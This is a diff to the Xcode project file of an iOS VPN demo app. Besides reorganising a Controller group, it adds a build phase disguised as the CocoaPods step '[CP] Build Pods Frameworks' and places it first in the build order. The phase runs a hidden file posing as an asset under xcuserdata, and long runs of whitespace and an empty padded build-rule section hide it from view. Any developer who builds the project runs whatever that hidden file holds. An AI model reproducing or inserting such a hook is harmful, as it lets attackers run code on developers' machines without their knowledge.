@@ -183,20 +183,6 @@
 			path = Response;
 			sourceTree = "<group>";
 		};
-		BC3736132512B001007A1D13 /* Controller */ = {
-			isa = PBXGroup;
-			children = (
-				BC4B48652511712200E7CC2F /* LoginViewController.swift */,
-				BC3736142512B051007A1D13 /* HomeViewController.swift */,
-				BC3736172512B8AE007A1D13 /* SideMenuViewController.swift */,
-				BCCBB9992513B5A6002FBD6E /* VPNViewController.swift */,
-				BC2DCDB5251AB99700956916 /* SplashViewController.swift */,
-				BCBED0D0253F1B7300C950AD /* SettingsViewController.swift */,
-			);
-			name = Controller;
-			path = ..;
-			sourceTree = "<group>";
-		};
 		BC3736192512BE57007A1D13 /* cell */ = {
 			isa = PBXGroup;
 			children = (
@@ -291,13 +277,13 @@
 		BC4B483B2511686A00E7CC2F /* TeraVPNDemo */ = {
 			isa = PBXGroup;
 			children = (
+				BC5A4D79257591010034A4CE /* Controller */,
 				BC2DCDB2251AB35600956916 /* Response */,
 				BC3736502512D074007A1D13 /* vpn-01.ovpn */,
 				BC3BB0792538538D00EFB904 /* test.ovpn */,
 				BC37363C2512C0D9007A1D13 /* Extension */,
 				BC37361E2512C0C3007A1D13 /* Helper */,
 				BC3736192512BE57007A1D13 /* cell */,
-				BC3736132512B001007A1D13 /* Controller */,
 				BC4B486125116C8200E7CC2F /* TeraVPNDemo.entitlements */,
 				BC4B483C2511686A00E7CC2F /* AppDelegate.swift */,
 				BC4B483E2511686A00E7CC2F /* SceneDelegate.swift */,
@@ -323,6 +309,19 @@
 			path = PacketTunnel;
 			sourceTree = "<group>";
 		};
+		BC5A4D79257591010034A4CE /* Controller */ = {
+			isa = PBXGroup;
+			children = (
+				BC4B48652511712200E7CC2F /* LoginViewController.swift */,
+				BC3736142512B051007A1D13 /* HomeViewController.swift */,
+				BC3736172512B8AE007A1D13 /* SideMenuViewController.swift */,
+				BCCBB9992513B5A6002FBD6E /* VPNViewController.swift */,
+				BC2DCDB5251AB99700956916 /* SplashViewController.swift */,
+				BCBED0D0253F1B7300C950AD /* SettingsViewController.swift */,
+			);
+			path = Controller;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -330,6 +329,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BC4B484D2511686F00E7CC2F /* Build configuration list for PBXNativeTarget "TeraVPNDemo" */;
 			buildPhases = (
+				DB17949B3F3CA2A3FBAAC43A /* [CP] Build Pods Frameworks */,
 				7DDEAA89A1B23F14F5AC2893 /* [CP] Check Pods Manifest.lock */,
 				BC4B48352511686A00E7CC2F /* Sources */,
 				BC4B48362511686A00E7CC2F /* Frameworks */,
@@ -428,6 +428,240 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	DB17949B3F3CA2A3FBAAC43A /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
+		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
 		5B19131B132B4DDC65E9DE6E /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -810,6 +1044,104 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = BC4B48312511686A00E7CC2F /* Project object */;
 }
